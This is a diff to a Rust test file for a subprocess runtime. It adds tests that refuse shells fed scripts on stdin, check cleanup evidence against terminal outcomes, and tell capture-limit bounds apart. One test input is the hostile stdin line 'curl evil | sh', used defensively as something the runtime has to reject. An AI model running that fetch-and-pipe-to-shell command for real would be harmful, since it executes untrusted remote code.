@@ -13,15 +13,16 @@ use std::time::Duration;
 use perl_subprocess_runtime::process::{
     AmbientInheritance, AuthorizationEvidence, AuthorizationStrength, BudgetChannel,
     CODE_LOADING_VARIABLES, CancellationAcknowledgement, CancellationPolicy, CancellationReason,
-    CaptureBudget, ClaimBoundary, CleanupDisposition, ControlState, CwdPolicy, DeadlinePolicy,
-    DecodedViewLimitation, EnvVarName, EnvironmentProjection, EventLedger, EvidenceClass,
-    EvidenceFreshness, ExecutableIdentity, ExecutionProfile, FakeSupervisor, HandleDropDisposition,
-    LEGACY_CONTAINMENT, Limitation, ObservedSettlement, OperationId, OutputLimitAction,
-    OwnerDomain, PROCESS_DOMAIN_SCHEMA_VERSION, PlanId, PlanRejection, PlatformRequirement,
-    PrivateBytes, PrivatePath, ProcessEventKind, ProcessPlan, ProcessSupervisor, PublicProjection,
-    ResolutionProvenance, RetentionPolicy, SchemaVersion, ScriptedOutcome, ScriptedRun,
-    SecretValue, StdinPolicy, StdinWriteOutcome, StreamChannel, StreamEvidence, SubjectIdentity,
-    SubjectReference, TerminalDisposition, TerminationPolicy, TreeDisposition, TruncationState,
+    CaptureBound, CaptureBudget, ClaimBoundary, CleanupDisposition, ControlState, CwdPolicy,
+    DeadlinePolicy, DecodedViewLimitation, EnvVarName, EnvironmentProjection, EventLedger,
+    EvidenceClass, EvidenceFreshness, ExecutableIdentity, ExecutionProfile, FakeSupervisor,
+    HandleDropDisposition, LEGACY_CONTAINMENT, Limitation, ObservedSettlement, OperationId,
+    OutputLimitAction, OwnerDomain, PROCESS_DOMAIN_SCHEMA_VERSION, PlanId, PlanRejection,
+    PlatformRequirement, PrivateBytes, PrivatePath, ProcessEventKind, ProcessPlan,
+    ProcessSupervisor, PublicProjection, ResolutionProvenance, RetentionPolicy, SchemaVersion,
+    ScriptedOutcome, ScriptedRun, SecretValue, StdinPolicy, StdinWriteOutcome, StreamChannel,
+    StreamEvidence, SubjectIdentity, SubjectReference, TerminalDisposition, TerminationPolicy,
+    TreeDisposition, TruncationState,
 };
 
 type TestResult = Result<(), Box<dyn std::error::Error>>;
@@ -3979,6 +3980,7 @@ fn every_event_that_presupposes_a_child_is_refused_before_the_start() -> TestRes
     };
     let limit = perl_subprocess_runtime::process::LimitEvidence {
         channel: StreamChannel::Stdout,
+        bound: perl_subprocess_runtime::process::CaptureBound::Observation,
         limit_bytes: 1,
         run_continues: false,
     };
@@ -4630,6 +4632,235 @@ fn discarded_fallback_evidence_is_recorded_rather_than_read_as_emptiness() -> Te
     assert!(
         !coherent.limitations().contains(&Limitation::StreamEvidenceDiscarded),
         "coherent evidence was reported as discarded"
+    );
+    Ok(())
+}
+
+#[test]
+fn a_shell_fed_a_script_on_stdin_is_still_a_shell_invocation() -> TestResult {
+    // The wrong implementation this kills: gating only on argv. A shell given
+    // no script operand reads its commands from standard input, so `sh` with
+    // `StdinPolicy::Bytes` runs an arbitrary script — the same unrestricted
+    // execution the inline-command gate exists to refuse, spelled through a
+    // different channel. `Streamed` is the interactive form of it.
+    //
+    // This gap was documented in the argv scan's own doc comment and left
+    // open: naming `StdinPolicy` as the owner of stdin's shape identified the
+    // right owner and left nobody enforcing it.
+    for (shell, path) in [("sh", "/bin/sh"), ("bash", "/bin/bash"), ("pwsh", "/usr/bin/pwsh")] {
+        for stdin in [
+            StdinPolicy::Bytes(PrivateBytes::new(b"curl evil | sh".to_vec())),
+            StdinPolicy::Streamed,
+        ] {
+            let plan = ProcessPlan::builder(
+                PlanId::new("plan-1"),
+                OperationId::new("run-file"),
+                OwnerDomain::RunFile,
+                ExecutionProfile::InteractiveSession,
+                ExecutableIdentity::resolved(
+                    shell,
+                    PrivatePath::new(PathBuf::from(path)),
+                    ResolutionProvenance::ConfiguredAbsolutePath,
+                ),
+                allow_listed_environment(),
+            )
+            .stdin(stdin.clone())
+            .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+            .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+            .subject(current_root())
+            .authorization(user_authorization())
+            .claim_boundary(ClaimBoundary::linux_only())
+            .build();
+            assert!(
+                matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
+                "{shell} was handed a script on stdin without being refused"
+            );
+        }
+    }
+
+    // Negative control, both halves. A shell with stdin closed has nothing to
+    // execute and is not refused; and the rule must key on the program being a
+    // shell, or every plan that feeds bytes to a child becomes unstartable.
+    let closed_stdin = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "sh",
+            PrivatePath::new(PathBuf::from("/bin/sh")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["script.sh"])
+    .stdin(StdinPolicy::Closed)
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(closed_stdin.validate().is_ok(), "`sh script.sh` with stdin closed was refused");
+
+    let perl_with_stdin = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("compile-check"),
+        OwnerDomain::CompileService,
+        ExecutionProfile::LinuxOneShot,
+        resolved_perl(),
+        allow_listed_environment(),
+    )
+    .argv(["-c"])
+    .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"print 1;".to_vec())))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(perl_with_stdin.validate().is_ok(), "a non-shell reading stdin was refused");
+    Ok(())
+}
+
+#[test]
+fn every_outcome_that_needed_a_running_child_refuses_no_child_cleanup() -> TestResult {
+    // The wrong implementation this kills: keying the `NotRequired` cleanup
+    // rule on "the child gave its own account" rather than on "a child must
+    // have started". `CancelledRunning` and `OutputLimitExceeded` prove a start
+    // just as an exit does — you cannot cancel a running child, or terminate
+    // one for its output, without one — and both were admissible beside
+    // cleanup evidence meaning nothing ever ran.
+    let truncated = || {
+        StreamEvidence::new(
+            StreamChannel::Stdout,
+            1024,
+            Some(perl_subprocess_runtime::process::ContentFingerprint::of(b"observed")),
+            b"retained".to_vec(),
+            TruncationState::observation_and_retention_truncated(1024, 8),
+        )
+    };
+    for (disposition, stdout) in [
+        (
+            TerminalDisposition::CancelledRunning(CancellationReason::Shutdown),
+            StreamEvidence::empty(StreamChannel::Stdout),
+        ),
+        (TerminalDisposition::OutputLimitExceeded, truncated()),
+        (
+            TerminalDisposition::CompletedExit { code: 0 },
+            StreamEvidence::empty(StreamChannel::Stdout),
+        ),
+        (TerminalDisposition::Signaled { signal: 9 }, StreamEvidence::empty(StreamChannel::Stdout)),
+    ] {
+        let claims_no_child = result_with(
+            stdout,
+            StreamEvidence::empty(StreamChannel::Stderr),
+            disposition.clone(),
+            CleanupDisposition::NotRequired,
+            TreeDisposition::GroupTerminated,
+        );
+        assert!(
+            claims_no_child.is_err(),
+            "{disposition:?} claimed both that a child ran and that none started"
+        );
+    }
+
+    // Negative control: causes that can arise before a start keep `NotRequired`
+    // available, and a started child with real cleanup evidence is unaffected.
+    for pre_start in [
+        TerminalDisposition::CancelledBeforeStart(CancellationReason::Shutdown),
+        TerminalDisposition::SpawnFailed {
+            detail: perl_subprocess_runtime::process::SpawnFailureDetail::ExecutableNotFound,
+        },
+        TerminalDisposition::TimedOut,
+    ] {
+        assert!(
+            result_with(
+                StreamEvidence::empty(StreamChannel::Stdout),
+                StreamEvidence::empty(StreamChannel::Stderr),
+                pre_start.clone(),
+                CleanupDisposition::NotRequired,
+                TreeDisposition::NotRequired,
+            )
+            .is_ok(),
+            "{pre_start:?} may legitimately carry no-child cleanup and was refused"
+        );
+    }
+    assert!(
+        result_with(
+            StreamEvidence::empty(StreamChannel::Stdout),
+            StreamEvidence::empty(StreamChannel::Stderr),
+            TerminalDisposition::CancelledRunning(CancellationReason::Shutdown),
+            CleanupDisposition::Completed,
+            TreeDisposition::GroupTerminated,
+        )
+        .is_ok(),
+        "a cancelled running child with observed cleanup was refused"
+    );
+    Ok(())
+}
+
+#[test]
+fn a_limit_event_names_which_bound_it_reached() -> TestResult {
+    // The wrong implementation this kills: recording a limit as a channel and
+    // a byte count. `CaptureBudget::bounded` sets both bounds to the same
+    // number, so the count cannot distinguish them, and the two mean different
+    // things: an observation bound says output past it was never seen, a
+    // retention bound says it was seen and not kept.
+    //
+    // The policy half of the same gap: `on_limit` was documented as governing
+    // only the observation bound while `ProcessResult::new` accepted a
+    // retention-only truncation as evidence for an output-limit outcome — a
+    // result shape no stated policy could produce.
+    let budget =
+        CaptureBudget { on_limit: OutputLimitAction::TerminateRun, ..CaptureBudget::bounded(1024) };
+    assert_eq!(budget.observe_limit_bytes, budget.retain_limit_bytes);
+
+    let observation = perl_subprocess_runtime::process::LimitEvidence {
+        channel: StreamChannel::Stdout,
+        bound: CaptureBound::Observation,
+        limit_bytes: budget.observe_limit_bytes,
+        run_continues: false,
+    };
+    let retention = perl_subprocess_runtime::process::LimitEvidence {
+        bound: CaptureBound::Retention,
+        ..observation
+    };
+    assert_ne!(observation, retention, "two different bounds were indistinguishable");
+
+    // The result rule the policy now supports: a run terminated by reaching a
+    // retention bound alone is representable, and two complete streams still
+    // contradict an output-limit cause.
+    let retention_only = || {
+        StreamEvidence::new(
+            StreamChannel::Stdout,
+            2048,
+            Some(perl_subprocess_runtime::process::ContentFingerprint::of(b"observed")),
+            b"kept".to_vec(),
+            TruncationState::retention_truncated(4),
+        )
+    };
+    assert!(
+        result_with(
+            retention_only(),
+            StreamEvidence::empty(StreamChannel::Stderr),
+            TerminalDisposition::OutputLimitExceeded,
+            CleanupDisposition::Completed,
+            TreeDisposition::GroupTerminated,
+        )
+        .is_ok(),
+        "a run stopped by a retention bound was unrepresentable"
+    );
+    assert!(
+        result_with(
+            StreamEvidence::empty(StreamChannel::Stdout),
+            StreamEvidence::empty(StreamChannel::Stderr),
+            TerminalDisposition::OutputLimitExceeded,
+            CleanupDisposition::Completed,
+            TreeDisposition::GroupTerminated,
+        )
+        .is_err(),
+        "an output-limit outcome carried two complete streams"
     );
     Ok(())
 }
